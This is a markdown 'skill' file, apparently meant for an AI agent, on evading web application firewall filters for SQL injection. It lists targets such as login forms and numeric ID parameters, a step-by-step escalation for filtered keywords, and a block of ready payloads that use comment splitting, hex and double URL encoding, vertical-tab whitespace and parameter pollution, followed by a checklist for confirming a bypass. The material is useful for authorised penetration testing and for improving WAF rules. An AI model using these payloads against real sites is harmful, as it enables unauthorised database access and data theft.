---
name: waf-evasion-sqli
description: Skill for bypassing WAF SQL injection filters using encoding, comment injection, alternative operators, and parameter manipulation. Built from the Awesome-WAF knowledge base.
sources: github
report_count: 40
---

# WAF Evasion - SQL Injection

## Crown Jewel Targets

- Login forms with SQL backends
- Search functionality
- Sort/order parameters
- Numeric ID parameters
- API endpoints with database queries

## Attack Surface Signals

- WAF blocks `' OR 1=1--` but allows `' OR '1'='1`
- WAF blocks `UNION SELECT` but allows `UNION/**/SELECT`
- WAF blocks `AND` but allows `&&` or `OR` equivalents
- Error messages reveal SQL syntax when WAF is bypassed

## Step-by-Step Methodology (Regex Reversing)

Progressive bypass escalation when keywords are filtered:

1. `and|or|union` filtered -> Use `1 || (select...)` (pipe operators)
2. `where` filtered -> Use `limit` clause instead
3. `limit` filtered -> Use `group by ... having` clause
4. `group by` filtered -> Use `substr(group_concat(...))` nesting
5. `select` filtered -> Use `into outfile` or `substr(...,1,1)` construction
6. `'` (single quote) filtered -> Hex encoding: `0x61` or `unhex(61)`
7. `hex` filtered -> Use `lower(conv(11,10,36))` for string generation
8. `substr` filtered -> Use `lpad(user,7,1)` instead
9. `white space` filtered -> Use `%0b` (vertical tab) as separator

## Payload & Detection Patterns

```sql
-- Comment injection
1' UN/**/ION SEL/**/ECT 1,2,3--

-- Alternative operators
1' || (SELECT 1 FROM dual WHERE 1=1)--

-- Hex encoding
1' UNION SELECT 0x61646D696E,2,3--

-- Double URL encoding
1%2527%2520UNION%2520SELECT%25201,2,3--

-- No quotes bypass
1' UNION SELECT CONCAT(0x61,0x64,0x6D,0x69,0x6E),2,3--

-- Whitespace bypass
1'%0bUNION%0bSELECT%0b1,2,3--

-- HPP splitting
?id=1&id=UNION&id=SELECT&id=1,2,3--
```

## Common Root Causes

- WAFs use regex-based SQLi detection that can be split
- Keyword blacklists are incomplete against equivalent operators
- Encoding normalization differs between WAF and database
- WAFs may not inspect all parameter sources (cookies, headers, body)

## Bypass Techniques

- Comment injection: `/**/`, `--`, `#`
- Case variation: `UnIoN`, `SeLeCt`
- Encoding: URL, double URL, hex, Unicode
- Alternative operators: `||` for `OR`, `&&` for `AND`
- HPP splitting across parameters

## Gate 0 Validation

- [ ] Have I identified which SQL keywords are filtered?
- [ ] Have I tried comment injection (`/**/`)?
- [ ] Have I tried alternative operators?
- [ ] Have I tested encoding variations?
- [ ] Is the bypass reproducible?
